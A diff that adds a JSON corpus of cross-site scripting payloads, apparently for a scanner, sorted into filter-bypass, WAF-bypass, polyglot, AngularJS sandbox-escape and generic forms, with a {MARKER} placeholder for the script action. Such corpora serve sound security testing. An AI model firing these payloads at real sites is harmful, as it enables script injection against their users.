@@ -1,0 +1,670 @@
+{
+ "class": "xss",
+ "entries": [
+  {
+   "payload": "<sCrIpt>{MARKER}</ScRipt>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<svg/onrandom=random onload={MARKER}>",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "\" onclick={MARKER}//<button ‘ onclick={MARKER}//> */ {MARKER}//",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{constructor.constructor('{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<script x>{MARKER}<script y>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<video onnull=null onmouseover={MARKER}>",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "';{MARKER}//';{MARKER}//\";{MARKER}//\";{MARKER}//-- ></SCRIPT>\">'><SCRIPT>{MARKER} </SCRIPT>",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{[].pop.constructor&#40'{MARKER}\\u00281\\u0029'&#41&#40&#41}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<scr<script>ipt>{MARKER}</scr<script>ipt>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror='{MARKER}' <",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<svg/OnLoad=\"`${{MARKER}}`\">",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "';{MARKER}//';{MARKER}//\";{MARKER}//\";{MARKER}//--></SCRIPT>\">'><SCRIPT>{MARKER}</SCRIPT>",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{0[a='constructor'][a]('{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "\"><script>{MARKER}</script>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<a href=\"\" onmousedown=\"var name = '&#39;;{MARKER}//'; {MARKER}\">Link</a>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "1'\"><img/src/onerror=.1|{MARKER}>",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "“ onclick={MARKER}//<button ‘ onclick={MARKER}//> */ {MARKER}//",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{$eval.constructor('{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<script>{MARKER}(983801..toString(36))</script> //parseInt(\"{MARKER}\",30) == 8680439 && 8680439..toString(30) == \"{MARKER}\"",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>window['{MARKER}'](document['domain'])</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "anythinglr00</script><script>{MARKER}</script>uxldz",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "javascript://'/</title></style></textarea></script>--><p\" onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{$on.constructor('{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<img src=x onerror={MARKER};>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>{MARKER}<script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<a href=javas&#99;ript:{MARKER}>",
+   "dialect": "waf-bypass",
+   "source": "XSS Injection/3 - XSS Common WAF Bypass.md"
+  },
+  {
+   "payload": "javascript://--></script></title></style>\"/</textarea>*/<{MARKER}/*' onclick={MARKER}//>a",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;${MARKER};}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<img src=x onerror={MARKER}//",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>onerror={MARKER};throw 1337</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript://</title>\"/</script></style></textarea/-->*/<{MARKER}/*' onclick={MARKER}//>/",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{'a'.constructor.prototype.charAt=[].join;${MARKER};}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<img src=x oneonerrorrror={MARKER};>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>{onerror={MARKER}}throw 1337</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript://</title></style></textarea>--></script><a\"//' onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "'{MARKER};'",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<img src=x:{MARKER} onerror={MARKER} alt=xss>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>throw onerror={MARKER},'some string',123,'haha'</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript://'//\" --></textarea></style></script></title><b onclick= {MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex){MARKER}')+{MARKER}+\\\"'\");}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "\"><img src=x onerror={MARKER};>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-{MARKER}//']</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript://</title></textarea></style></script --><li '//\" '*/{MARKER}/*', onclick={MARKER}//",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"{MARKER}\"].sort(toString.constructor);}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<><img src=1 onerror={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<object onafterscriptexecute={MARKER}>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript:{MARKER}//--></script></textarea></style></title><a\"//' onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<svg/onload={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<object onbeforescriptexecute={MARKER}>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "--></script></title></style>\"/</textarea><a' onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex){MARKER}')+{MARKER}+\"'\");}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<svg onload={MARKER}//",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror\\x00={MARKER} />",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "/</title/'/</style/</script/</textarea/--><p\" onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'{MARKER}')()}}",
+   "dialect": "angular",
+   "source": "XSS Injection/5 - XSS in Angular.md"
+  },
+  {
+   "payload": "<svg id={MARKER} onload={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror\\x0b={MARKER} />",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript://--></title></style></textarea></script><svg \"//' onclick={MARKER}//",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "\"><svg/onload={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror\\x0d={MARKER} />",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "/</title/'/</style/</script/--><p\" onclick={MARKER}//>*/{MARKER}/*",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "\"><svg/onload={MARKER}",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror\\x0a={MARKER} />",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload={MARKER}//>",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "<svg><script href=data:,{MARKER} />(`Firefox` is the only browser which allows self closing script)",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img src='1' onerror/={MARKER} />",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover={MARKER}//>",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "<svg><script>{MARKER}",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<img/src='1'/onerror={MARKER}>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover={MARKER}//>",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "<svg><script>{MARKER}&lpar;'33'&rpar;",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "\"><svg/onload={MARKER}>\"@x.y",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover={MARKER}//'>`",
+   "dialect": "polyglot",
+   "source": "XSS Injection/2 - XSS Polyglot.md"
+  },
+  {
+   "payload": "<div onpointerover=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "xss@example.com(<img src='x' onerror='{MARKER}'>)",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<div onpointerdown=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "+330011223344;phone-context=<script>{MARKER}</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<div onpointerenter=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<div id = \"x\"></div><script>{MARKER}</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<div onpointerleave=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "foo=\"text </script><script>{MARKER}</script>\";",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<div onpointermove=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<div onpointerout=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' * {MARKER} * 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<div onpointerup=\"{MARKER}\">MOVE HERE</div>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' / {MARKER} / 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<body onload={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' - {MARKER} - 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<input autofocus onfocus={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' + {MARKER} + 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<select autofocus onfocus={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' ^ {MARKER} ^ 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<textarea autofocus onfocus={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' > {MARKER} > 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<keygen autofocus onfocus={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' < {MARKER} < 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<video/poster/onerror={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' == {MARKER} == 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<video><source onerror=\"javascript:{MARKER}\">",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' & {MARKER} & 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<video src=_ onloadstart=\"{MARKER}\">",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' , {MARKER} , 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<details/open/ontoggle=\"{MARKER}\">",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' | {MARKER} | 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<audio src onloadstart={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' ? {MARKER} : 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<marquee onstart={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' in {MARKER} in 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<meter value=2 min=0 max=10 onmouseover={MARKER}>2 out of 10</meter>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "'te' instanceof {MARKER} instanceof 'xt';",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<body ontouchstart={MARKER}> // Triggers when a finger touch the screen",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script>{MARKER}&DiacriticalGrave;1&DiacriticalGrave;</script>",
+   "dialect": "filter-bypass",
+   "source": "XSS Injection/1 - XSS Filter Bypass.md"
+  },
+  {
+   "payload": "<body ontouchend={MARKER}>   // Triggers when a finger is removed from touch screen",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<body ontouchmove={MARKER}>  // When a finger is dragged across the screen.",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<svg/onload='{MARKER}.then(r=>r.text().then(t=>{MARKER}))'>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"{MARKER}\">",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"{MARKER}\"  style=\"content-visibility:auto\" >",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "#\"><img src=/ onerror={MARKER}>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "javascript:{MARKER}",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "data:text/html,<script>{MARKER}</script>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<value><![CDATA[<script>{MARKER}</script>]]></value>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<desc><script>{MARKER}</script></desc>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<foreignObject><script>{MARKER}</script></foreignObject>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<title><script>{MARKER}</script></title>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<animatetransform onbegin=\"{MARKER}\"></animatetransform>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<svg><desc><![CDATA[</desc><script>{MARKER}</script>]]></svg>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>{MARKER}</script>]]></svg>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<svg><title><![CDATA[</title><script>{MARKER}</script>]]></svg>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<script type=\"text/javascript\">{MARKER};</script>",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload={MARKER}>\");",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "\"url\": \"javascript:{MARKER}\",",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  },
+  {
+   "payload": "<noscript><p title=\"</noscript><img src=x onerror={MARKER}>\">",
+   "dialect": "generic",
+   "source": "XSS Injection/README.md"
+  }
+ ]
+}
